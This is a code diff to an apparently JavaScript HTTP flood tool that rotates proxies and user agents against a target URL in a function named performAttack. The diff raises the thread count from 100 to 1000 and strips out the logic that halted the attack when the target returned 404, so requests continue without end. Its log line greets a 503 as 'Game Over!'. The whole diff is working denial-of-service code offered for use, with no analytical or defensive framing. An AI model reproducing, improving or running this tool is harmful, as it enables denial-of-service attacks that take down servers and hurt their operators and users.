@@ -98,7 +98,7 @@ const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
 const requestsPerSecond = 10000000;
-const numThreads = 100;
+const numThreads = 1000;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
 const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");
@@ -172,10 +172,6 @@ const performAttack = (url, agent, continueAttack) => {
         setTimeout(() => performAttack(url, agent, continueAttack), 0);
     })
     .catch((err) => {
-        if (err.response?.status === 404) {
-        continueAttack = false;
-        return;
-        }
         setTimeout(() => performAttack(url, agent, continueAttack), 0);
     });
 
@@ -187,10 +183,6 @@ const performAttack = (url, agent, continueAttack) => {
         setTimeout(() => performAttack(url, agent, continueAttack), 0);
     })
     .catch((err) => {
-        if (err.response?.status === 404) {
-        continueAttack = false;
-        return;
-        }
         setTimeout(() => performAttack(url, agent, continueAttack), 0);
     });
 
@@ -214,9 +206,7 @@ const performAttack = (url, agent, continueAttack) => {
         ) {
            // console.log(rainbow("Unable to Attack Target Server Refused!"));
         } else if (err.response?.status === 404) {
-            console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
-            continueAttack = false;
-            return;
+        //    console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
         } else if (err.response?.status === 503) {
             console.log(rainbow("Target under heavy load (503) - Game Over!"));
         } else if (err.response?.status === 502) {
